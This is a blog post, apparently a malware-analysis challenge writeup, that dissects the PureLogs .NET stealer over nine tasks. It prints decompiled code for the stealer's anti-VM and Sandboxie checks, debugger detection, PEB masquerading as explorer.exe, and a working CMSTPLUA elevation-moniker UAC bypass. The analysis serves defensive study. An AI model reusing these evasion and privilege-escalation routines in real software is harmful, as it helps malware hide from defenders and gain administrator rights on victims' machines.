@@ -1,0 +1,488 @@
+---
+title: 'MalOps - PureLogs Stealer Writeup'
+description: 'My writeups for PureLogs Stealer [Medium] Challenge'
+date: 2026-01-27
+tags: ['MalOps', 'Reverse', 'Malware']
+image: './banner.jpg'
+authors: ['enscribe']
+password: 'MalOps-26.01.27'
+---
+
+import Callout from '@/components/Callout.astro'
+import { Icon } from 'astro-icon/components'
+
+## Scenario
+
+As a malware analyst at ThreatScope Inc., you’ve been contacted by the internal SOC team regarding a potential compromise. Last week, the SOC flagged unusual outbound traffic from a user workstation — large bursts of encrypted data being sent to an unknown IP. Upon checking the system, the user admitted to downloading a free “PDF editor” from an unknown Discord server. The binary they ran was named PDFEditorPro.exe. Your task is to analyze the sample, determine its capabilities, and uncover what information it attempts to steal and how it communicates with its operator.
+
+## Analysis Process
+
+This is a **real type of malware**, and there have been many analyses of it. Sample Hash (SHA-256):
+
+```shell
+7505E02F9E72CE781892C01AC7638A8FAC011F39C020CDA61E2EADA9EEE1C31D
+```
+
+Analysis Challenge: https://malops.io/challenges/10
+
+### Task 1: PureLogs is obfuscated and packed to hinder static analysis. Which commercial .NET packer is used to protect the PureLogs binary?
+
+To find out which **commercial .NET packer** is being used to protect the PureLogs binary, simply load the malware into the **Detect It Easy** tool. The output will be as follows:
+
+```shell
+...
+Language: MSIL/C#
+Library: .NET Framework(v4.7.2, CLR v4.0.30319)
+Protector: .NET Reactor(6.X)[Control Flow]
+...
+```
+
+The malware is a **.NET (C#)** program and it has been obfuscated by **.NET Reactor 6.x**. We can use the [.NET Reactor Slayer](https://github.com/SychicBoy/NETReactorSlayer/releases/tag/v6.4.0.0) tool for deobufuscation, making the code easier to read and analyze.
+
+<div class="mx-auto">![Old TOC implementation](assets/task1-1.png)</div>
+
+### Task 2: What is the name of the mutex created by PureLogs?
+
+The malware deploys mutexes (mutually exclusive objects) to ensure only one instance runs on the infected system. This prevents resource conflicts and reduces the chance of detection through unusual system behavior.
+
+In `class13`, we have a function named `smethod_3()` as follows:
+
+```csharp
+public static bool smethod_3()
+{
+    bool result;
+    Class13.mutex_0 = new Mutex(false, GClass4.string_3, ref result);
+    return result;
+}
+```
+
+This function creates a **Mutex** with the name stored in `GClass4.string_3` as follows:
+
+```csharp
+public static string string_3 = "FQBnanyetMxSRRO";
+```
+
+### Task 3: PureLogs includes several anti-analysis checks before proceeding with execution. One of them specifically targets a well-known sandboxing tool. What process name does PureLogs check for to detect this sandbox?
+
+In the `class3`, we can see that there are many functions used for **anti-sandboxing** and **anti-VM**. First, let's talk about **anti-VM**:
+
+```csharp
+public static bool smethod_3()
+{
+List<string> list = new List<string>
+{
+    "virtual",
+    "vmbox",
+    "vmware",
+    "virtualbox",
+    "box",
+    "thinapp",
+    "VMXh",
+    "innotek gmbh",
+    "tpvcgateway",
+    "tpautoconnsvc",
+    "vbox",
+    "kvm",
+    "red hat",
+    "xen",
+    "hyper-v",
+    "qemu",
+    "virtualpc",
+    "parallels",
+    "fusion",
+    "proxmox",
+    "esxi",
+    "vsphere",
+    "hypervisor"
+};
+bool result;
+using (List<string>.Enumerator enumerator = Class3.smethod_4().GetEnumerator())
+{
+    if (!enumerator.MoveNext())
+    {
+        return false;
+    }
+    string item = enumerator.Current;
+    result = list.Contains(item);
+}
+return result;
+}
+
+
+private static List<string> smethod_4()
+{
+    List<string> list = new List<string>();
+    try
+    {
+        ManagementObject managementObject = new ManagementObjectSearcher("root\\CIMV2", "SELECT * FROM Win32_ComputerSystem").Get().OfType<ManagementObject>().Where(new Func<ManagementObject, bool>(Class3.<>c.<>c_0.method_0)).FirstOrDefault<ManagementObject>();
+        List<string> list2 = list;
+        object obj = managementObject["Manufacturer"];
+        list2.Add((obj != null) ? obj.ToString().ToLower() : null);
+        List<string> list3 = list;
+        object obj2 = managementObject["Model"];
+        list3.Add((obj2 != null) ? obj2.ToString().ToLower() : null);
+    }
+    catch
+    {
+    }
+    return list;
+}
+```
+
+In the `smethod_4()` function, it uses a **WMI query** to retrieve information about the running machine, then compares it with the list of keywords - if there is a match, it `returns true`.
+With **anti-sandbox**, it's as follows:
+
+```csharp
+public static bool smethod_1()
+    {
+        return Process.GetProcessesByName("SbieCtrl").Length != 0 & Class3.GetModuleHandle("SbieDll.dll") != IntPtr.Zero;
+    }
+```
+
+It checks if `SbieCtrl.exe` is running and if `SbieDll.dll` has been loaded. If so, it stops immediately. So the sandbox tool here is **Sandboxie**.
+
+### Task 4: PureLogs avoids external analysis by querying a debugger-related state via a process handle. What Windows API function is used for this check?
+
+Also in `class3`, pay attention to the following code:
+
+```csharp
+[DllImport("kernel32.dll", ExactSpelling = true, SetLastError = true)]
+public static extern bool CheckRemoteDebuggerPresent(IntPtr intptr_0, ref bool bool_0);
+
+private static bool smethod_2()
+{
+    bool result;
+    try
+    {
+        bool flag = false;
+        Class3.CheckRemoteDebuggerPresent(Process.GetCurrentProcess().Handle, ref flag);
+        result = flag;
+    }
+    catch
+    {
+        result = false;
+    }
+    return result;
+}
+```
+
+The code imports `kernel32.dll` and uses the `CheckRemoteDebuggerPresent` API function to check if a process is currently **being debugged**. You can read more about function API [here](https://learn.microsoft.com/en-us/windows/win32/api/debugapi/nf-debugapi-checkremotedebuggerpresent).
+
+### Task 5: PureLogs checks a specific registry key to know if it has already run on the system before. What is the full path of that registry key?
+
+The malware prevents multiple instances of a program from running simultaneously using the **Windows Registry** as a lock mechanism. Look at the code in `class13` as follows:
+
+<div class="mx-auto">![Old TOC implementation](assets/task5-1.png)</div>
+
+First, it checks if the configuration setting in `GClass4.string_18` is enabled, and if so, searches for a specific registry key in `HKEY_CURRENT_USER\Software\` with the name stored in `GClass4.string_19`.
+
+**Registry markers** are only created when **Registry-check** is enabled, and this is the first time it's run and has passed `Class13.smethod_0()`.
+
+Checking the value in the variable `GClass4.string_19` will give us the answer.
+
+```csharp
+public static string string_19 = "IqswyHgVpagFHxu";
+```
+
+> HKEY_CURRENT_USER\Software\IqswyHgVpagFHxu
+
+### Task 6: PureLogs modifies its process name and command-line to appear as a legitimate Windows process. What process name does it use to masquerade as a trusted system process?
+
+Also within `class13`, we have the following code:
+
+```csharp
+if (!Class13.smethod_0())
+{
+    Class12.smethod_4("C:\\Windows\\explorer.exe");
+    Class13.smethod_2();
+    Environment.Exit(0);
+}
+```
+
+It calls the `smethod_4` function with the parameter being the path of a **legitimate process**, delving deeper into the analysis of `smethod_4`:
+
+```csharp
+public static bool smethod_4(string string_0)
+{
+    int id = Process.GetCurrentProcess().Id;
+    IntPtr intptr_ = Class12.OpenProcess((Class12.Enum1)1080U, false, id);
+    Class12.Struct4 @struct = default(Class12.Struct4);
+    IntPtr intPtr = Class12.smethod_2(@struct);
+    int num = 0;
+    if (Class12.NtQueryInformationProcess(intptr_, 0, intPtr, Marshal.SizeOf<Class12.Struct4>(@struct), ref num) != 0)
+    {
+        return false;
+    }
+    @struct = Class12.smethod_0<Class12.Struct4>(intPtr);
+    Console.WriteLine("[+] Process ID is: {0}", @struct.uintptr_0);
+    IntPtr zero = IntPtr.Zero;
+    Class12.Struct6 struct2 = default(Class12.Struct6);
+    IntPtr intPtr2 = Class12.smethod_2(struct2);
+    if (!Class12.ReadProcessMemory(intptr_, @struct.intptr_1, intPtr2, Marshal.SizeOf<Class12.Struct6>(struct2), out zero))
+    {
+        return false;
+    }
+    struct2 = Class12.smethod_0<Class12.Struct6>(intPtr2);
+    Class12.Struct7 struct3 = default(Class12.Struct7);
+    IntPtr intPtr3 = Class12.smethod_2(struct3);
+    if (!Class12.ReadProcessMemory(intptr_, struct2.intptr_2, intPtr3, Marshal.SizeOf<Class12.Struct7>(struct3), out zero))
+    {
+        return false;
+    }
+    struct3 = Class12.smethod_0<Class12.Struct7>(intPtr3);
+    Class12.RtlEnterCriticalSection(struct2.intptr_6);
+    IntPtr zero2 = IntPtr.Zero;
+    IntPtr zero3 = IntPtr.Zero;
+    zero2 = new IntPtr(struct2.intptr_3.ToInt64() + 96L);
+    zero3 = new IntPtr(struct2.intptr_3.ToInt64() + 112L);
+    if (!Class12.smethod_3(intptr_, zero2, "ImagePathName", string_0))
+    {
+        return false;
+    }
+    if (Class12.smethod_3(intptr_, zero3, "CommandLine", string_0))
+    {
+        StringBuilder stringBuilder = new StringBuilder(255);
+        Class12.GetModuleFileName(IntPtr.Zero, stringBuilder, stringBuilder.Capacity);
+        string a = stringBuilder.ToString();
+        IntPtr intptr_2 = ((Class12.Struct7)Marshal.PtrToStructure(struct2.intptr_2, typeof(Class12.Struct7))).struct3_0.intptr_0;
+        IntPtr intptr_3 = struct3.struct3_0.intptr_0;
+        IntPtr zero4;
+        IntPtr zero5;
+        for (;;)
+        {
+            Class12.Struct8 struct4 = (Class12.Struct8)Marshal.PtrToStructure(intptr_3, typeof(Class12.Struct8));
+            zero4 = IntPtr.Zero;
+            zero5 = IntPtr.Zero;
+            zero4 = new IntPtr(intptr_3.ToInt64() + 72L);
+            zero5 = new IntPtr(intptr_3.ToInt64() + 88L);
+            string b = struct4.struct2_0.ToString();
+            if (a == b)
+            {
+                break;
+            }
+            intptr_3 = struct4.struct3_0.intptr_0;
+            if (!(intptr_3 != intptr_2))
+            {
+                goto IL_289;
+            }
+        }
+        if (!Class12.smethod_3(intptr_, zero4, "FullDllName", string_0))
+        {
+            return false;
+        }
+        if (!Class12.smethod_3(intptr_, zero5, "BaseDllName", string_0))
+        {
+            return false;
+        }
+        IL_289:
+        Class12.RtlLeaveCriticalSection(struct2.intptr_6);
+        Class12.CloseHandle(intptr_);
+        return true;
+    }
+    return false;
+}
+```
+
+First, it calls [GetCurrentProcess](https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-getcurrentprocess) to get the current process's pid, and then calls [OpenProcess](https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-openprocess) to open its own process with `1080` privileges (`0x438`).
+
+Then call [NtQueryInformationProcess](https://learn.microsoft.com/en-us/windows/win32/api/winternl/nf-winternl-ntqueryinformationprocess) to get the [**PEB**](https://learn.microsoft.com/en-us/windows/win32/api/winternl/ns-winternl-peb).
+
+```csharp
+NtQueryInformationProcess(
+    hProcess,
+    0,                  // ProcessBasicInformation
+    pStruct,
+    sizeof,
+    ref retLen
+)
+```
+
+Continue calling `ReadProcessMemory` to read **PEB** from memory and read `LoaderData` (`PEB_LDR_DATA`). Next, calculate the addresses of `ImagePathName` and `CommandLine` using hardcode offset.
+
+```csharp
+IntPtr pImagePath = new IntPtr(peb.intptr_3.ToInt64() + 96L);
+IntPtr pCmdLine   = new IntPtr(peb.intptr_3.ToInt64() + 112L);
+```
+
+Call `smethod_3` to overwrite the **ImagePathName** and **CommandLine** of the process with string_0 (i.e., `C:\\Windows\\explorer.exe`).
+
+It also calls [GetModuleFileName](https://learn.microsoft.com/en-us/windows/win32/api/libloaderapi/nf-libloaderapi-getmodulefilenamea) to find the **process's main module entry** in the loader list and rename it to the legitimate process.
+
+This technique is a type of **Defense Evasion** and its name is **PEB Masquerading**. You can read more about it [here](https://www.ired.team/offensive-security/defense-evasion/masquerading-processes-in-userland-through-_peb#execution).
+
+### Task 7: What WMI class does PureLogs query to retrieve the system’s manufacturer and model?
+
+We have already analyzed this question in previous tasks. However, we will clarify some concepts below:
+
+<Callout title="What is WMI?" variant="note">
+  **WMI (Windows Management Instrumentation)** is the Windows "management
+  system" that allows programs to query system information and manage the
+  computer, such as Manufacturer, Model, CPU, RAM, etc.
+</Callout>
+
+<Callout title="What is ManagementObjectSearcher Class?" variant="note">
+  **ManagementObjectSearcher** is a .NET class (namespace System.Management)
+  used to query WMI on Windows.
+</Callout>
+
+```csharp
+public static bool smethod_3()
+{
+List<string> list = new List<string>
+{
+    "virtual",
+    "vmbox",
+    "vmware",
+    "virtualbox",
+    "box",
+    "thinapp",
+    "VMXh",
+    "innotek gmbh",
+    "tpvcgateway",
+    "tpautoconnsvc",
+    "vbox",
+    "kvm",
+    "red hat",
+    "xen",
+    "hyper-v",
+    "qemu",
+    "virtualpc",
+    "parallels",
+    "fusion",
+    "proxmox",
+    "esxi",
+    "vsphere",
+    "hypervisor"
+};
+bool result;
+using (List<string>.Enumerator enumerator = Class3.smethod_4().GetEnumerator())
+{
+    if (!enumerator.MoveNext())
+    {
+        return false;
+    }
+    string item = enumerator.Current;
+    result = list.Contains(item);
+}
+return result;
+}
+
+
+private static List<string> smethod_4()
+{
+    List<string> list = new List<string>();
+    try
+    {
+        ManagementObject managementObject = new ManagementObjectSearcher("root\\CIMV2", "SELECT * FROM Win32_ComputerSystem").Get().OfType<ManagementObject>().Where(new Func<ManagementObject, bool>(Class3.<>c.<>c_0.method_0)).FirstOrDefault<ManagementObject>();
+        List<string> list2 = list;
+        object obj = managementObject["Manufacturer"];
+        list2.Add((obj != null) ? obj.ToString().ToLower() : null);
+        List<string> list3 = list;
+        object obj2 = managementObject["Model"];
+        list3.Add((obj2 != null) ? obj2.ToString().ToLower() : null);
+    }
+    catch
+    {
+    }
+    return list;
+}
+```
+
+Therefore, the final answer is: `Win32_ComputerSystem`.
+
+### Task 8: PureLogs uses a trick to bypass the "Run as Administrator" (UAC) prompt by starting a special COM object. What exact string does it add before the COM CLSID to request an elevated instance?
+
+First, let's clarify some concepts:
+
+<Callout title="What is UAC?" variant="note">
+UAC stands for **User Account Control in Windows**.
+It's a mechanism that prevents programs from running with administrator privileges without your permission, thereby reducing the risk of malware.
+
+</Callout>
+
+In `class13` and within the function `smethod_1`:
+
+```csharp
+public static object smethod_1(Guid guid_0, Guid guid_1)
+{
+    string str = guid_0.ToString("B");
+    string string_ = "Elevation:Administrator!new:" + str;
+    Class13.Struct9 structure = default(Class13.Struct9);
+    structure.uint_0 = (uint)Marshal.SizeOf<Class13.Struct9>(structure);
+    structure.intptr_0 = IntPtr.Zero;
+    structure.uint_5 = 4U;
+    return Class13.CoGetObject(string_, ref structure, guid_1);
+}
+```
+
+It creates a **COM object** with **Administrator** privileges via the **elevation moniker** and retrieves the desired **interface**.
+
+<Callout title="What is COM?" variant="note">
+  COM stands for **Component Object Model** – a Windows “component system” that
+  allows a program to call the functionality of another component (which may be
+  written in a different language and run in a different process) in a
+  standardized way.
+
+COM uses **GUIDs**:
+
+- **CLSID**: ID of the COM class (which object it creates)
+- **IID**: ID of the interface (which "function set" of that object you want to use)
+
+</Callout>
+
+<Callout title="What is Elevation Moniker?" variant="note">
+  **Elevation Moniker** is a special COM moniker syntax on Windows, used to
+  request the system to create a COM object with elevated privileges — usually
+  Administrator privileges — through the UAC mechanism.
+</Callout>
+
+We see that function `smethod_1` is called in `smethod_2` as follows:
+
+```csharp
+public static void smethod_2()
+{
+    if (Convert.ToBoolean(GClass4.string_0) && ClassAntiMalwareAnalysis.anti_VM())
+    {
+        Environment.Exit(0);
+        return;
+    }
+    if (Convert.ToBoolean(GClass4.string_2) && GClass2.smethod_0())
+    {
+        Environment.Exit(0);
+        return;
+    }
+    Guid guid_ = new Guid("3E5FC7F9-9A51-4367-9063-A120244FBEC7");
+    Guid guid_2 = new Guid("6EDD6D74-C007-4E75-B76A-E5740995E24C");
+    Class13.Interface0 @interface = (Class13.Interface0)Class13.smethod_1(guid_, guid_2);
+    @interface.ShellExec(Assembly.GetExecutingAssembly().Location, null, null, 0UL, 5UL);
+    Marshal.ReleaseComObject(@interface);
+}
+```
+
+The purpose of the first two `if` blocks is to check the environment and then exit. Next are the following two **GUIDs**:
+
+```csharp
+Guid guid_  = new Guid("3E5FC7F9-9A51-4367-9063-A120244FBEC7");  // CMSTPLUA
+Guid guid_2 = new Guid("6EDD6D74-C007-4E75-B76A-E5740995E24C");  // sICMLuaUtil
+```
+
+With CLSID here, it would become:
+
+```shell
+Elevation:Administrator!new:{3E5FC7F9-9A51-4367-9063-A120244FBEC7}
+```
+
+Then call `ShellExec` to run itself again with **higher administrative privileges**.
+
+```csharp
+@interface.ShellExec(Assembly.GetExecutingAssembly().Location, null, null, 0UL, 5UL);
+```
+
+> `ShellExec` is a method in the `ICMLuaUtil` interface.
+
+It doesn't directly elevate the current process. Instead, it borrows an existing Windows COM component to run elevated and perform the task requiring higher privileges (in this case: re-running itself).
+Therefore, the answer would be `Elevation:Administrator!new:`.
+
+### Task 9: PureLogs uses COM objects to silently bypass User Account Control (UAC) and relaunch itself with elevated privileges. What ATT&CK technique does this behavior map to?
+
+As we analyzed in the previous task, this behavior directly maps to ATT&CK: [**T1548.002 – Abuse Elevation Control Mechanism: Bypass User Account Control (UAC)**](https://attack.mitre.org/techniques/T1548/002) .
